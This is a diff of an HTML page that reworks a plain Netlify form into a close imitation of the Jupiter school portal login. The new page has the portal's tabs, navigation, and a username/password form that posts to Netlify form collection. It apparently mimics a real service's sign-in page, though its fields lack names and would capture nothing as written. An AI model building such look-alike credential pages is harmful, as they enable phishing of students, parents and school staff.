@@ -1,40 +1,65 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Jupiter Ed</title>
-    <link rel="stylesheet" href="styles.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Jupiter Login</title>
+  <link rel="stylesheet" href="styles.css"/>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-box">
-            <h2>Login</h2>
-            <form name="contact" method="POST" data-netlify="true">
-  <p>
-    <label>Your Name: <input type="text" name="name" /></label>
-  </p>
-  <p>
-    <label>Your Email: <input type="email" name="email" /></label>
-  </p>
-  <p>
-    <label>Your Role: <select name="role[]" multiple>
-      <option value="leader">Leader</option>
-      <option value="follower">Follower</option>
-    </select></label>
-  </p>
-  <p>
-    <label>Message: <textarea name="message"></textarea></label>
-  </p>
-  <p>
-    <button type="submit">Send</button>
-  </p>
-</form>
+  <header>
+    <div class="logo">🌐 JUPITER</div>
+    <nav>
+      <a href="#">Español</a>
+      <a href="#">Signup</a>
+      <a href="#">EdStore</a>
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">About</a>
+    </nav>
+  </header>
 
-            <div class="forgot-password">
-                <a href="#">Forgot your password?</a>
-            </div>
+  <main>
+    <div class="login-box">
+      <div class="tabs">
+        <button class="tab">Student</button>
+        <button class="tab">Parent</button>
+        <button class="tab">Sub</button>
+        <button class="tab">TA</button>
+        <button class="tab active">Staff</button>
+      </div>
+<!form name="contact" method="POST" data-netlify="true">
+  <!p>
+    <!label>Your Name: <!input type="text" name="name" /><!/label>
+  <!/p>
+  <!p>
+    <!label>Your Email: <!input type="email" name="email" /><!/label>
+  <!/p>
+  <!p>
+    <!label>Your Role: <!select name="role[]" multiple>
+      <!option value="leader">Leader<!/option>
+      <!option value="follower">Follower<!/option>
+    <!/select><!/label>
+  <!/p>
+  <!p>
+    <!label>Message: <!textarea name="message"><!/textarea><!/label>
+  <!/p>
+  <!p>
+    <!button type="submit">Send<!/button>
+  <!/p>
+</form>
+      <form method="POST" data-netlify="true">
+        <input type="text" placeholder="Username" />
+        <input type="password" placeholder="Password" />
+        <select>
+          <option>Lock screen if idle 5 minutes</option>
+        </select>
+        <div class="buttons">
+          <button type="button" class="help-btn">Help Me Login</button>
+          <button type="submit" class="login-btn">Login</button>
         </div>
+      </form>
     </div>
+  </main>
 </body>
 </html>
